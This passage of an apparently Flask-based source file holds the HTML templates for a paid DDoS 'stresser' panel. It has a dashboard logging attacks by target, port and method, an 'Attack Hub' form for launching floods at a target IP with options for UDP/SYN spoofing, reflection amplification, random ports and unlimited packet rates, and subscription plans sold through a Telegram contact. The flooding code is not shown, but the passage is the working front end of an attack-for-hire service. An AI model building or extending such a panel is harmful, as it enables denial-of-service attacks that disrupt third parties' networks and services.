.empty-icon  { font-size: 36px; opacity: 0.3; margin-bottom: 10px; }

/* Card description */
.card-desc { font-size: 14px; color: var(--muted); margin-bottom: 4px; }

/* Responsive */
@media (max-width: 800px) {
  .sidebar { transform: translateX(-100%); }
  .sidebar.open { transform: translateX(0); }
  .main { margin-left: 0; padding: 70px 16px 24px; }
  .menu-toggle { display: flex; }
  .stats-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<!-- Mobile toggle -->
<button class="menu-toggle" id="menuToggle"><i class="fas fa-bars"></i></button>

<!-- Sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-logo">
    <div class="logo-text">⚡ STRESSER</div>
    <div class="logo-sub">Control Panel</div>
  </div>

  <div class="nav-section-label">Navigation</div>
  <nav>
    <a href="/dashboard" class="nav-link active"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
    <a href="/attack" class="nav-link"><i class="fas fa-bolt"></i> Attack Hub</a>
    <a href="/products" class="nav-link"><i class="fas fa-layer-group"></i> Products</a>
    <a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
  </nav>

  <div class="plan-box">
    <div class="plan-badge">⚡ {{ user.plan }}</div>
    <div class="plan-stat">
      <span class="plan-stat-label"><i class="fas fa-hourglass-half"></i> Duration</span>
      <span class="plan-stat-val">{{ user.max_duration }}s</span>
    </div>
    <div class="plan-stat">
      <span class="plan-stat-label"><i class="fas fa-layer-group"></i> Concurrent</span>
      <span class="plan-stat-val">{{ user.max_concurrent }}</span>
    </div>
    <div class="plan-stat">
      <span class="plan-stat-label"><i class="fas fa-microchip"></i> Threads</span>
      <span class="plan-stat-val">{{ user.max_threads }}</span>
    </div>
    {% if user.expiry %}
    <div class="plan-stat">
      <span class="plan-stat-label"><i class="far fa-calendar-alt"></i> Expires</span>
      <span class="plan-stat-val">{{ user.expiry.strftime('%Y-%m-%d') }}</span>
    </div>
    {% endif %}
  </div>
</div>

<!-- Main -->
<div class="main">

  <div class="page-header">
    <h1 class="page-title">Dashboard</h1>
    <div class="online-pill"><div class="online-dot"></div> Online</div>
  </div>

  <!-- Network Status -->
  <div class="section-title"><i class="fas fa-chart-line"></i> Network Status</div>
  <div class="card">
    <div class="stats-row">
      <div class="stat-card">
        <div class="stat-number">{{ slots_used }}</div>
        <div class="stat-label">Slots Used</div>
      </div>
      <div class="stat-card">
        <div class="stat-number">{{ max_slots }}</div>
        <div class="stat-label">Max Slots</div>
      </div>
    </div>

    <div class="progress-header">
      <span>Network Load</span>
      <span class="progress-pct">{{ (slots_used/max_slots*100)|round(0) if max_slots>0 else 0 }}%</span>
    </div>
    <div class="progress-track">
      <div class="progress-fill" style="width: {{ (slots_used/max_slots*100) if max_slots>0 else 0 }}%;"></div>
    </div>

    <a href="/products" class="btn-upgrade">⚡ Upgrade Plan</a>
  </div>

  <!-- Redeem Key -->
  <div class="section-title"><i class="fas fa-key"></i> Redeem Key</div>
  <div class="card">
    <p class="card-desc">Have a premium access key? Redeem it to upgrade your plan instantly.</p>
    <form method="POST" action="/redeem">
      <div class="redeem-row">
        <input type="text" name="key" class="redeem-input" placeholder="XXXX-XXXX-XXXX-XXXX" required autocomplete="off" spellcheck="false">
        <button type="submit" class="btn-redeem"><i class="fas fa-unlock" style="margin-right:6px;"></i>Redeem</button>
      </div>
    </form>
    <div class="redeem-note">Key will be applied to your current account.</div>
  </div>

  <!-- Recent Activity -->
  <div class="section-title"><i class="fas fa-history"></i> Recent Activity</div>
  <div class="card" style="padding:0; overflow:hidden;">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Target</th>
            <th>Port</th>
            <th>Duration</th>
            <th>Method</th>
            <th>Mode</th>
            <th>Threads</th>
            <th>Status</th>
            <th>Time</th>
          </tr>
        </thead>
        <tbody>
          {% for a in attacks %}
          <tr>
            <td class="target-cell">{{ a.target }}</td>
            <td style="font-family:'Orbitron',monospace;font-size:12px;">{{ a.port }}</td>
            <td style="font-family:'Orbitron',monospace;font-size:12px;">{{ a.duration }}s</td>
            <td class="method-cell">{{ a.method }}</td>
            <td class="method-cell">{{ a.mode }}</td>
            <td style="font-family:'Orbitron',monospace;font-size:12px;">{{ a.threads }}</td>
            <td>
              <span class="status-badge s-done">{{ a.status }}</span>
            </td>
            <td style="font-size:12px;color:var(--muted);font-family:'Orbitron',monospace;">{{ a.timestamp.strftime('%H:%M:%S') }}</td>
          </tr>
          {% else %}
          <tr>
            <td colspan="8">
              <div class="empty-state">
                <div class="empty-icon"><i class="fas fa-history"></i></div>
                No recent activity
              </div>
            </td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

</div>

<script>
const toggle = document.getElementById('menuToggle');
const sidebar = document.getElementById('sidebar');
toggle.addEventListener('click', () => sidebar.classList.toggle('open'));
document.addEventListener('click', e => {
  if (sidebar.classList.contains('open') && !sidebar.contains(e.target) && e.target !== toggle) {
    sidebar.classList.remove('open');
  }
});
</script>
</body>
</html>

'''

ATTACK_HTML = '''
<!DOCTYPE html>
<html><head><title>Attack Hub • </title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; padding:20px; animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;transition:0.2s;width:100%;}
.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%;}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body><div class="container py-4">
<div class="glass-card"><h2 class="mb-3"><i class="fas fa-bolt me-2"></i> Launch Attack</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{cat}}">{{msg}}</div>{% endfor %}{% endwith %}
<form method="POST">
    <div class="row">
        <div class="col-md-6"><label>Target IP</label><input type="text" name="target" placeholder="1.1.1.1" required></div>
        <div class="col-md-6"><label>Port</label><input type="number" name="port" placeholder="443" required></div>
    </div>
    <div class="row mt-3">
        <div class="col-md-4"><label>Duration (max {{ user.max_duration }}s)</label><input type="number" name="duration" value="60" required></div>
        <div class="col-md-4"><label>Threads (max {{ user.max_threads }})</label><input type="number" name="threads" value="1500" required></div>
        <div class="col-md-4"><label>Concurrent (max {{ user.max_concurrent }})</label><input type="number" name="concurrent" value="1" required></div>
    </div>
    <div class="row mt-3">
        <div class="col-md-6">
            <label>Attack Method</label>
            <select name="method" class="form-select bg-dark text-white">
                {% for val, label in methods %}
                <option value="{{ val }}">{{ label }}</option>
                {% endfor %}
            </select>
        </div>
        <div class="col-md-6">
            <label>Attack Mode</label>
            <select name="mode" class="form-select bg-dark text-white">
                <option value="default">Default (Mixed Payloads)</option>
                <option value="max-pps">⚡ Max PPS (Tiny Packets)</option>
                <option value="max-bandwidth">🌊 Max Bandwidth (Reflection/Large)</option>
                <option value="both">🔥 Both (Blended 70% BW / 30% PPS)</option>
            </select>
        </div>
    </div>
    <div class="mt-3">
        <label class="form-check-label me-3"><input type="checkbox" name="random_ports" value="1"> Random Ports</label>
        <label class="form-check-label me-3"><input type="checkbox" name="random_delay" value="1"> Random Delay</label>
        <label class="form-check-label me-3"><input type="checkbox" name="spoof" value="1"> Spoof (UDP/SYN)</label>
        <label class="form-check-label"><input type="checkbox" name="flood" value="1"> Flood Mode (No Output)</label>
    </div>
    <div class="mt-3"><label>PPS Limit (0 = unlimited)</label><input type="number" name="pps_limit" class="form-control bg-dark text-white" value="0" min="0"></div>
    <button type="submit" class="btn-neon mt-4">💥 Launch Attack</button>
</form></div>
<a href="/dashboard" class="btn btn-link text-info">← Back to Dashboard</a></div>
</body></html>
'''

PRODUCTS_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Plans • </title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #030508;
  --accent: #00ffcc;
  --accent2: #00aaff;
  --accent3: #ff6b35;
  --gold: #ffd700;
  --surface: rgba(6, 16, 28, 0.7);
  --border: rgba(0, 255, 200, 0.15);
  --text: #cce8e0;
  --muted: rgba(180, 220, 210, 0.45);
  --radius: 24px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  padding: 32px 20px;
  position: relative;
  overflow-x: hidden;
}

/* ── Background ── */
.bg-layer {
  position: fixed;
  inset: 0;
  z-index: 0;
  pointer-events: none;
}
.bg-grid {
  position: absolute;
  inset: 0;
  background-image:
    linear-gradient(rgba(0,255,200,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,255,200,0.03) 1px, transparent 1px);
  background-size: 56px 56px;
}
.bg-orb {
  position: absolute;
  border-radius: 50%;
  filter: blur(100px);
  animation: orbFloat linear infinite;
}
.orb-a { width: 600px; height: 600px; background: radial-gradient(#00ffcc22, transparent 70%); top: -200px; left: -150px; animation-duration: 20s; }
.orb-b { width: 500px; height: 500px; background: radial-gradient(#00aaff1a, transparent 70%); bottom: -150px; right: -100px; animation-duration: 26s; animation-direction: reverse; }
.orb-c { width: 300px; height: 300px; background: radial-gradient(#ff6b3514, transparent 70%); top: 40%; right: 10%; animation-duration: 33s; }

@keyframes orbFloat {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(40px,-30px) scale(1.07); }
  66%  { transform: translate(-20px, 20px) scale(0.95); }
  100% { transform: translate(0,0) scale(1); }
}

/* ── Scanline effect ── */
.scanlines {
  position: fixed;
  inset: 0;
  z-index: 1;
  pointer-events: none;
  background: repeating-linear-gradient(
    0deg,
    transparent,
    transparent 3px,
    rgba(0,0,0,0.08) 3px,
    rgba(0,0,0,0.08) 4px
  );
}

/* ── Layout ── */
.container {
  position: relative;
  z-index: 10;
  max-width: 1200px;
  margin: 0 auto;
}

/* ── Header ── */
.topbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 48px;
  animation: slideDown 0.6s cubic-bezier(0.22,1,0.36,1) both;
}
@keyframes slideDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }

.back-btn {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  color: var(--muted);
  text-decoration: none;
  font-size: 14px;
  font-weight: 600;
  letter-spacing: 1px;
  text-transform: uppercase;
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 10px;
  padding: 8px 16px;
  transition: all 0.2s;
}
.back-btn:hover { color: var(--accent); border-color: var(--border); background: rgba(0,255,200,0.05); }

.page-badge {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: rgba(0,255,200,0.08);
  border: 1px solid var(--border);
  border-radius: 20px;
  padding: 6px 16px;
  font-size: 12px;
  font-weight: 700;
  letter-spacing: 2px;
  text-transform: uppercase;
  color: var(--accent);
}

/* ── Hero text ── */
.hero {
  text-align: center;
  margin-bottom: 56px;
  animation: fadeUp 0.7s cubic-bezier(0.22,1,0.36,1) 0.1s both;
}
@keyframes fadeUp { from { opacity:0; transform:translateY(24px); } to { opacity:1; transform:translateY(0); } }

.hero-title {
  font-family: 'Orbitron', monospace;
  font-size: clamp(28px, 5vw, 52px);
  font-weight: 900;
  line-height: 1.1;
  background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 50%, var(--accent) 100%);
  background-size: 200% auto;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  animation: shimmer 4s linear infinite;
  letter-spacing: -1px;
}
@keyframes shimmer { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }

.hero-sub {
  color: var(--muted);
  font-size: 17px;
  margin-top: 12px;
  letter-spacing: 0.5px;
}

/* ── Plans grid ── */
.plans-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
  gap: 20px;
  margin-bottom: 32px;
}

/* ── Plan card ── */
.plan-card {
  background: var(--surface);
  backdrop-filter: blur(16px);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 32px 24px;
  text-align: center;
  position: relative;
  overflow: hidden;
  transition: all 0.3s cubic-bezier(0.22,1,0.36,1);
  animation: cardIn 0.6s cubic-bezier(0.22,1,0.36,1) both;
  cursor: default;
}
.plan-card:nth-child(1) { animation-delay: 0.1s; }
.plan-card:nth-child(2) { animation-delay: 0.2s; }
.plan-card:nth-child(3) { animation-delay: 0.3s; }
.plan-card:nth-child(4) { animation-delay: 0.4s; }

@keyframes cardIn {
  from { opacity:0; transform:translateY(30px) scale(0.96); }
  to   { opacity:1; transform:translateY(0) scale(1); }
}

.plan-card::before {
  content: '';
  position: absolute;
  top: 0; left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, transparent, var(--accent), transparent);
  opacity: 0;
  transition: opacity 0.3s;
}
.plan-card:hover {
  border-color: rgba(0,255,200,0.45);
  transform: translateY(-6px);
  box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 30px rgba(0,255,200,0.08);
}
.plan-card:hover::before { opacity: 1; }

/* Popular badge */
.plan-card.popular {
  border-color: rgba(0,255,200,0.4);
  background: rgba(0,255,200,0.05);
}
.popular-badge {
  position: absolute;
  top: 16px; right: 16px;
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  color: #020408;
  font-size: 10px;
  font-weight: 800;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  padding: 4px 10px;
  border-radius: 20px;
}

/* Plan name */
.plan-name {
  font-family: 'Orbitron', monospace;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 2px;
  text-transform: uppercase;
  color: var(--muted);
  margin-bottom: 16px;
}

/* Price */
.price-wrap {
  margin-bottom: 24px;
}
.price {
  font-family: 'Orbitron', monospace;
  font-size: 42px;
  font-weight: 900;
  color: var(--accent);
  line-height: 1;
  text-shadow: 0 0 20px rgba(0,255,200,0.3);
}
.price-period {
  font-size: 13px;
  color: var(--muted);
  margin-top: 4px;
  letter-spacing: 0.5px;
}

/* Divider */
.card-divider {
  height: 1px;
  background: linear-gradient(90deg, transparent, rgba(0,255,200,0.2), transparent);
  margin: 0 -8px 24px;
}

/* Specs */
.specs {
  list-style: none;
  text-align: left;
  margin-bottom: 28px;
}
.spec-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 8px 0;
  font-size: 14px;
  font-weight: 500;
  border-bottom: 1px solid rgba(255,255,255,0.04);
  letter-spacing: 0.3px;
}
.spec-item:last-child { border-bottom: none; }
.spec-icon {
  width: 28px; height: 28px;
  background: rgba(0,255,200,0.08);
  border: 1px solid rgba(0,255,200,0.15);
  border-radius: 8px;
  display: flex; align-items: center; justify-content: center;
  font-size: 12px;
  flex-shrink: 0;
  color: var(--accent);
}
.spec-label { color: var(--muted); font-size: 12px; flex: 1; }
.spec-value { font-weight: 700; color: var(--text); }

/* CTA button */
.btn-cta {
  display: block;
  width: 100%;
  padding: 13px;
  background: linear-gradient(135deg, rgba(0,255,200,0.12), rgba(0,170,255,0.12));
  border: 1px solid rgba(0,255,200,0.3);
  border-radius: 12px;
  color: var(--accent);
  font-family: 'Orbitron', monospace;
  font-size: 12px;
  font-weight: 700;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  text-decoration: none;
  text-align: center;
  cursor: pointer;
  transition: all 0.25s ease;
  position: relative;
  overflow: hidden;
}
.btn-cta::before {
  content: '';
  position: absolute;
  inset: 0;
  background: linear-gradient(135deg, rgba(0,255,200,0.15), rgba(0,170,255,0.15));
  opacity: 0;
  transition: opacity 0.25s;
}
.btn-cta:hover { border-color: var(--accent); box-shadow: 0 0 20px rgba(0,255,200,0.2); transform: translateY(-1px); color: var(--accent); }
.btn-cta:hover::before { opacity: 1; }

.plan-card.popular .btn-cta {
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  border-color: transparent;
  color: #020408;
  font-weight: 800;
}
.plan-card.popular .btn-cta:hover { box-shadow: 0 0 30px rgba(0,255,200,0.4); transform: translateY(-1px); color: #020408; }
.plan-card.popular .btn-cta::before { display: none; }

/* ── Custom plan banner ── */
.custom-banner {
  background: var(--surface);
  backdrop-filter: blur(16px);
  border: 1px solid rgba(0,170,255,0.2);
  border-radius: var(--radius);
  padding: 36px 40px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 24px;
  flex-wrap: wrap;
  animation: fadeUp 0.7s cubic-bezier(0.22,1,0.36,1) 0.5s both;
  position: relative;
  overflow: hidden;
}
.custom-banner::before {
  content: '';
  position: absolute;
  inset: 0;
  background: linear-gradient(135deg, rgba(0,170,255,0.04), transparent 60%);
  pointer-events: none;
}
.custom-left { flex: 1; min-width: 200px; }
.custom-title {
  font-family: 'Orbitron', monospace;
  font-size: 20px;
  font-weight: 700;
  color: var(--accent2);
  margin-bottom: 6px;
}
.custom-sub { color: var(--muted); font-size: 15px; }

.btn-telegram {
  display: inline-flex;
  align-items: center;
  gap: 10px;
  background: linear-gradient(135deg, #0088cc, #00aaff);
  border: none;
  border-radius: 12px;
  padding: 14px 28px;
  color: #fff;
  font-family: 'Orbitron', monospace;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 1px;
  text-decoration: none;
  transition: all 0.25s ease;
  white-space: nowrap;
  box-shadow: 0 4px 20px rgba(0,136,204,0.3);
}
.btn-telegram:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,136,204,0.45); color: #fff; }
.btn-telegram i { font-size: 16px; }

/* ── Responsive ── */
@media (max-width: 640px) {
  .plans-grid { grid-template-columns: 1fr; }
  .custom-banner { flex-direction: column; text-align: center; }
  .hero-title { font-size: 28px; }
  .topbar { flex-direction: column; gap: 12px; }
}
</style>
</head>
<body>

<div class="bg-layer">
  <div class="bg-grid"></div>
  <div class="bg-orb orb-a"></div>
  <div class="bg-orb orb-b"></div>
  <div class="bg-orb orb-c"></div>
</div>
<div class="scanlines"></div>

<div class="container">

  <!-- Top bar -->
  <div class="topbar">
    <a href="/dashboard" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    <div class="page-badge"><i class="fas fa-bolt"></i> &nbsp; Upgrade Plan</div>
  </div>

  <!-- Hero -->
  <div class="hero">
    <h1 class="hero-title">Choose Your Plan</h1>
    <p class="hero-sub">Scalable power. Instant access. Zero limits.</p>
  </div>

  <!-- Plans -->
  <div class="plans-grid">
    {% for plan in plans %}
    <div class="plan-card {% if loop.index == 2 %}popular{% endif %}">
      {% if loop.index == 2 %}<div class="popular-badge">⚡ Popular</div>{% endif %}

      <div class="plan-name">{{ plan.name }}</div>

      <div class="price-wrap">
        <div class="price">{{ plan.price }}</div>
        <div class="price-period">per month</div>
      </div>

      <div class="card-divider"></div>

      <ul class="specs">
        <li class="spec-item">
          <div class="spec-icon"><i class="fas fa-layer-group"></i></div>
          <span class="spec-label">Concurrent</span>
          <span class="spec-value">{{ plan.concurrent }}</span>
        </li>
        <li class="spec-item">
          <div class="spec-icon"><i class="fas fa-hourglass-half"></i></div>
          <span class="spec-label">Max Duration</span>
          <span class="spec-value">{{ plan.duration }}s</span>
        </li>
        <li class="spec-item">
          <div class="spec-icon"><i class="fas fa-microchip"></i></div>
          <span class="spec-label">Threads</span>
          <span class="spec-value">{{ plan.threads }}</span>
        </li>
      </ul>

      <a href="https://t.me/Ig_ansh" target="_blank" class="btn-cta">
        <i class="fab fa-telegram-plane"></i> &nbsp; Get This Plan
      </a>
    </div>
    {% endfor %}
  </div>

  <!-- Custom plan -->
  <div class="custom-banner">
    <div class="custom-left">
      <div class="custom-title">🛠️ Need Something Custom?</div>
      <div class="custom-sub">Higher limits, dedicated resources, or special configurations — reach out directly.</div>
    </div>
    <a href="https://t.me/Ig_ansh" target="_blank" class="btn-telegram">
      <i class="fab fa-telegram-plane"></i> Contact @Ig_ansh
    </a>
  </div>

</div>
</body>
</html>
'''

REDEEM_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Redeem Key • </title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #030508;
  --surface: rgba(6, 16, 28, 0.75);
  --border: rgba(0, 255, 200, 0.18);
  --accent: #00ffcc;
  --accent2: #00aaff;
  --text: #cce8e0;
  --muted: rgba(180, 220, 210, 0.45);
  --radius: 28px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px;
  overflow: hidden;
  position: relative;
}

/* Background */
.bg-grid {
  position: fixed;
  inset: 0;
  z-index: 0;
  background-image:
    linear-gradient(rgba(0,255,200,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,255,200,0.03) 1px, transparent 1px);
  background-size: 56px 56px;
  pointer-events: none;
}
.orb {
  position: fixed;
  border-radius: 50%;
  filter: blur(90px);
  opacity: 0.2;
  pointer-events: none;
  animation: drift linear infinite;
}
.orb-1 { width: 500px; height: 500px; background: radial-gradient(#00ffcc, transparent 70%); top: -180px; left: -120px; animation-duration: 22s; z-index: 0; }
.orb-2 { width: 400px; height: 400px; background: radial-gradient(#00aaff, transparent 70%); bottom: -120px; right: -80px; animation-duration: 28s; animation-direction: reverse; z-index: 0; }

@keyframes drift {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(30px,-25px) scale(1.06); }
  66%  { transform: translate(-20px,18px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

/* Card */
.card {
  position: relative;
  z-index: 10;
  background: var(--surface);
  backdrop-filter: blur(20px) saturate(1.4);
  -webkit-backdrop-filter: blur(20px) saturate(1.4);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 48px 44px;
  width: 100%;
  max-width: 460px;
  box-shadow: 0 30px 60px rgba(0,0,0,0.5), 0 0 80px rgba(0,255,200,0.04) inset;
  animation: slideUp 0.7s cubic-bezier(0.22,1,0.36,1) both;
}

@keyframes slideUp {
  from { opacity: 0; transform: translateY(30px) scale(0.97); }
  to   { opacity: 1; transform: translateY(0) scale(1); }
}

/* Corner accents */
.card::before {
  content: '';
  position: absolute;
  top: -1px; left: -1px;
  width: 72px; height: 72px;
  border-top: 2px solid var(--accent);
  border-left: 2px solid var(--accent);
  border-radius: var(--radius) 0 0 0;
  opacity: 0.8;
}
.card::after {
  content: '';
  position: absolute;
  bottom: -1px; right: -1px;
  width: 72px; height: 72px;
  border-bottom: 2px solid var(--accent2);
  border-right: 2px solid var(--accent2);
  border-radius: 0 0 var(--radius) 0;
  opacity: 0.8;
}

/* Header */
.header {
  text-align: center;
  margin-bottom: 36px;
}
.icon-wrap {
  width: 64px; height: 64px;
  background: linear-gradient(135deg, rgba(0,255,200,0.12), rgba(0,170,255,0.12));
  border: 1px solid var(--border);
  border-radius: 18px;
  display: flex; align-items: center; justify-content: center;
  margin: 0 auto 20px;
  font-size: 28px;
  animation: glow 3s ease-in-out infinite;
}
@keyframes glow {
  0%, 100% { box-shadow: 0 0 20px rgba(0,255,200,0.2); }
  50%       { box-shadow: 0 0 40px rgba(0,255,200,0.45); }
}

.title {
  font-family: 'Orbitron', monospace;
  font-size: 24px;
  font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  letter-spacing: -0.5px;
}
.subtitle {
  color: var(--muted);
  font-size: 14px;
  margin-top: 6px;
  letter-spacing: 0.3px;
}

/* Alerts */
.alert {
  padding: 12px 16px;
  border-radius: 12px;
  font-size: 14px;
  margin-bottom: 20px;
  border: 1px solid;
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 500;
  animation: fadeIn 0.3s ease;
}
@keyframes fadeIn { from { opacity:0; transform:translateY(-6px); } to { opacity:1; transform:translateY(0); } }
.alert-danger  { background: rgba(255,77,109,0.1);  border-color: rgba(255,77,109,0.3);  color: #ff8fa3; }
.alert-success { background: rgba(0,255,200,0.08);  border-color: rgba(0,255,200,0.3);   color: var(--accent); }
.alert-warning { background: rgba(255,190,50,0.1);  border-color: rgba(255,190,50,0.3);  color: #ffd166; }

/* Key input area */
.key-field { margin-bottom: 24px; }

.key-label {
  display: block;
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  color: var(--muted);
  margin-bottom: 10px;
}

.key-input-wrap {
  position: relative;
}

.key-icon {
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 18px;
  pointer-events: none;
  opacity: 0.5;
}

input[type="text"] {
  width: 100%;
  background: rgba(0,0,0,0.45);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 14px;
  padding: 15px 18px 15px 50px;
  color: var(--text);
  font-family: 'Orbitron', monospace;
  font-size: 13px;
  letter-spacing: 1px;
  outline: none;
  transition: all 0.25s ease;
}
input::placeholder {
  color: rgba(180,220,210,0.25);
  font-family: 'Rajdhani', sans-serif;
  font-size: 15px;
  letter-spacing: 0.5px;
}
input:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(0,255,200,0.1), 0 0 20px rgba(0,255,200,0.07);
  background: rgba(0,255,200,0.03);
}

/* Key segments hint */
.key-hint {
  display: flex;
  align-items: center;
  gap: 6px;
  margin-top: 8px;
  padding-left: 4px;
}
.key-seg {
  font-size: 11px;
  font-family: 'Orbitron', monospace;
  color: rgba(0,255,200,0.3);
  letter-spacing: 1px;
}
.key-sep { color: rgba(255,255,255,0.15); font-size: 11px; }

/* Submit button */
.btn-redeem {
  width: 100%;
  padding: 15px;
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  border: none;
  border-radius: 14px;
  color: #020408;
  font-family: 'Orbitron', monospace;
  font-size: 13px;
  font-weight: 900;
  letter-spacing: 2px;
  text-transform: uppercase;
  cursor: pointer;
  transition: all 0.25s ease;
  position: relative;
  overflow: hidden;
}
.btn-redeem::before {
  content: '';
  position: absolute;
  inset: 0;
  background: rgba(255,255,255,0.18);
  transform: translateX(-100%) skewX(-15deg);
  transition: transform 0.4s ease;
}
.btn-redeem:hover::before { transform: translateX(100%) skewX(-15deg); }
.btn-redeem:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 30px rgba(0,255,200,0.35);
}
.btn-redeem:active { transform: translateY(0); }

/* Info box */
.info-box {
  background: rgba(0,170,255,0.05);
  border: 1px solid rgba(0,170,255,0.15);
  border-radius: 12px;
  padding: 14px 16px;
  margin: 20px 0;
  display: flex;
  gap: 10px;
  align-items: flex-start;
}
.info-box-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
.info-box-text { font-size: 13px; color: var(--muted); line-height: 1.55; }
.info-box-text strong { color: var(--accent2); }

/* Footer links */
.footer {
  text-align: center;
  margin-top: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  flex-wrap: wrap;
}
.footer a {
  color: var(--accent);
  text-decoration: none;
  font-size: 13px;
  font-weight: 600;
  letter-spacing: 0.3px;
  transition: color 0.2s;
}
.footer a:hover { color: #fff; }
.footer-sep { color: rgba(255,255,255,0.15); font-size: 13px; }
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="card">

  <div class="header">
    <div class="icon-wrap">🔑</div>
    <h1 class="title">Redeem Key</h1>
    <p class="subtitle">Enter your access key to unlock your plan</p>
  </div>

  {% with messages = get_flashed_messages(with_categories=true) %}
    {% for cat, msg in messages %}
      <div class="alert alert-{{ cat }}">
        {% if cat == 'danger' %}⚠️{% elif cat == 'success' %}✅{% else %}ℹ️{% endif %}
        {{ msg }}
      </div>
    {% endfor %}
  {% endwith %}

  <form method="POST" autocomplete="off">

    <div class="key-field">
      <label class="key-label">Access Key</label>
      <div class="key-input-wrap">
        <span class="key-icon">🗝️</span>
        <input type="text" name="key" placeholder="XXXX-XXXX-XXXX-XXXX" required autocomplete="off" spellcheck="false">
      </div>
      <div class="key-hint">
        <span class="key-seg">XXXX</span>
        <span class="key-sep">—</span>
        <span class="key-seg">XXXX</span>
        <span class="key-sep">—</span>
        <span class="key-seg">XXXX</span>
        <span class="key-sep">—</span>
        <span class="key-seg">XXXX</span>
      </div>
    </div>

    <button type="submit" class="btn-redeem">⚡ Activate Key</button>

  </form>

  <div class="info-box">
    <div class="info-box-icon">💡</div>
    <div class="info-box-text">
      Keys are <strong>single-use</strong> and tied to your account once redeemed. Contact support if your key isn't working.
    </div>
  </div>

  <div class="footer">
    <a href="/login">← Back to Login</a>
    <span class="footer-sep">|</span>
    <a href="/register">Register</a>
  </div>

</div>

